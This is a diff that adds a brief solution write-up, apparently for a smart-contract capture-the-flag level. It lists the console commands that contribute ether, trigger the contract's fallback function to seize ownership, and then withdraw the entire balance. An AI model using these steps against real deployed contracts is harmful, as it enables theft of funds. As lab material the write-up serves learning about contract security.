@@ -1,0 +1,7 @@
+1) I contributed 0.0009 ether to the contract using
+await contract.contribute({from:player,value:toWei(0.0009)})
+
+2) Then I triggered the fallback function by sending 0.0003 ether which made me the owner.
+ sendTransaction({from:player,value:toWei(0.0003),to:instance})
+
+3) I reduced the contract's balance to 0 by using----- await contract.withdraw()
